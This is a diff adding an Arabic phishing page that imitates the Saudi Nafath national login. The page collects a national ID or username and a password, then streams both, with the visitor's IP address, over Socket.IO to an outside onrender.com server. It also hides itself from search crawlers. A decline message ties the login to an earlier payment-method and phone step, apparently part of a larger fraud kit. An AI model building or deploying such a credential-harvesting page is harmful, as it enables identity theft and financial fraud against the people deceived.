@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>Nafad</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    crossorigin="anonymous" />
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Tajawal", sans-serif;
+      font-weight: 400;
+    }
+
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</head>
+
+<body dir="rtl" style="background-color: #f4f6f9">
+  <nav class="navbar navbar-expand-lg navbar-light pt-4 pb-4 shadow" style="background-color: #fff">
+    <img alt="" src="assets/icon/nafad.png" width="128" />
+    <button class="navbar-toggler ml-2" type="button" data-toggle="collapse" data-target="#mainNav"
+      aria-controls="mainNav" aria-expanded="false" aria-label="Toggle navigation">
+      <i class="fas fa-bars"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="mainNav">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item"><a class="nav-link" href="#">الرئيسية</a></li>
+        <li class="nav-item"><a class="nav-link" href="#">من نحن</a></li>
+        <li class="nav-item"><a class="nav-link" href="#">اتصل بنا</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <div class="text-center mt-5">
+    <h1 style="font-size: 28px; color: #11998e; font-weight: 800">
+      الدخول على النظام
+    </h1>
+  </div>
+  <div class="mt-4 text-center" style="
+        border-radius: 5px;
+        font-weight: bold;
+        background-color: #c2c2c2;
+        color: white;
+        cursor: pointer;
+        padding: 18px;
+        width: 100%;
+        font-size: 15px;
+      ">
+    تطبيق نفاذ
+  </div>
+  <div class="text-center" style="
+        border-radius: 5px;
+        font-weight: bold;
+        background-color: #11998e;
+        color: white;
+        cursor: pointer;
+        padding: 18px;
+        width: 100%;
+        font-size: 15px;
+      ">
+    اسم المستخدم وكلمة المرور
+  </div>
+
+  <div class="mt-4" style="padding: 0 18px">
+    <div style="
+          margin-bottom: 30px;
+          padding: 30px;
+          border-radius: 5px;
+          background-color: #fafafa;
+          box-shadow: 0 10px 60px 0 rgba(29, 29, 31, 0.09);
+        ">
+      <form class="text-right" id="nafadLoginForm">
+        <div class="form-group">
+          <label for="input_user" style="color: #586673; font-size: 14px">
+            اسم المستخدم \ الهوية الوطنية
+          </label>
+          <input class="form-control" id="input_user" type="text" minlength="3" maxlength="16"
+            pattern="^(?:(?:10|20)[0-9]{8}|[A-Za-z0-9]{3,16})$"
+            title="ادخل إما رقم هوية وطني سعودي (10 أرقام يبدأ بـ10 أو 20) أو اسم مستخدم إنجليزي (3–16 حرفًا)"
+            oninput="this.value = this.value.replace(/[^0-9A-Za-z]/g,'').slice(0,16)" required />
+        </div>
+        <div class="form-group">
+          <label for="input_password" style="color: #586673; font-size: 14px">
+            كلمة المرور
+          </label>
+          <input class="form-control" id="input_password" type="password" minlength="5"
+            pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{5,}$"
+            title="يجب أن تحتوي كلمة المرور على حرف صغير واحد على الأقل، وحرف كبير واحد، ورقم واحد، وبطول 5 أحرف على الأقل. يمكنك استخدام رموز خاصة."
+            required />
+          <div class="invalid-feedback">
+            كلمة المرور يجب أن تحتوي على حرف صغير واحد على الأقل، وحرف كبير
+            واحد، ورقم واحد، وبطول 5 أحرف على الأقل.
+          </div>
+        </div>
+
+        <div class="alert alert-danger text-right" role="alert" id="decline-message" style="display: none">
+          <span>
+            عذرًا، بيانات النفاذ الوطني التي تم إدخالها لا تتطابق مع طريقة
+            الدفع ورقم الجوال المُدخل.
+          </span>
+        </div>
+        <button class="btn btn-primary col-12" style="background-color: #11998e; font-size: 14px" type="submit">
+          تسجيل الدخول
+        </button>
+      </form>
+
+      <div class="d-flex justify-content-center mt-3">
+        <button class="btn btn-light" style="
+              border: 1px solid #586673;
+              font-size: 11.5px;
+              border-radius: 5px;
+              width: 65%;
+            ">
+          إعادة تعيين/تغيير كلمة المرور
+        </button>
+        <button class="btn btn-light" style="
+              border: 1px solid #586673;
+              font-size: 11.5px;
+              border-radius: 5px;
+              width: 35%;
+            ">
+          حساب جديد
+        </button>
+      </div>
+    </div>
+    <div class="mt-5">
+      <img alt="" src="assets/photos/footerNafad.png" width="100%" />
+    </div>
+  </div>
+
+  <!-- loading overlay (initially hidden) -->
+  <div id="loadingOverlay">
+    <div class="text-center text-white">
+      <div class="spinner-border text-light mb-3" role="status"></div>
+      <h5 class="font-weight-bold">يرجى الانتظار</h5>
+      <p>انتظر حتى تتم معالجة طلبك</p>
+    </div>
+  </div>
+
+  <!-- 1) Socket.IO -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    window.visitorIP = null;
+    (async () => {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await r.json();
+        window.visitorIP = ip;
+        const page = location.pathname.split("/").pop() || "nafad.html";
+        socket.emit("updateLocation", { ip, page });
+      } catch (e) {
+        console.error("IP fetch failed", e);
+      }
+    })();
+  </script>
+
+  <!-- 2) location.js -->
+  <script src="./assets/js/location.js"></script>
+
+  <!-- 3) Form → socket + overlay -->
+  <script>
+    const form = document.getElementById("nafadLoginForm");
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      // do not proceed if HTML5 invalid
+      if (!form.checkValidity()) {
+        form.classList.add("was-validated");
+        return;
+      }
+
+      // show spinner-overlay
+      document.getElementById("loadingOverlay").style.display = "flex";
+
+      // wait for IP
+      while (!window.visitorIP) {
+        await new Promise((r) => setTimeout(r, 50));
+      }
+
+      console.log("📤 submitting Nafad with ip=", window.visitorIP);
+
+      socket.emit("submitNafad", {
+        ip: window.visitorIP,
+        username: document.getElementById("input_user").value,
+        password: document.getElementById("input_password").value,
+      });
+    });
+    document.addEventListener("DOMContentLoaded", () => {
+      // 3a) Show decline‐message if URL contains '?declined=true'
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("declined") === "true") {
+        document.getElementById("decline-message").style.display = "block";
+      }
+      window.socket.on("ackNafad", (resp) => {
+        if (resp.success) {
+          // keep overlay on; location.js will handle navigation
+        } else {
+          // hide overlay on error
+          overlay.classList.remove("d-flex");
+          overlay.classList.add("d-none");
+          msg.style.display = "block";
+          console.error(resp.error);
+        }
+      });
+    });
+  </script>
+
+  <!-- 4) jQuery then Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
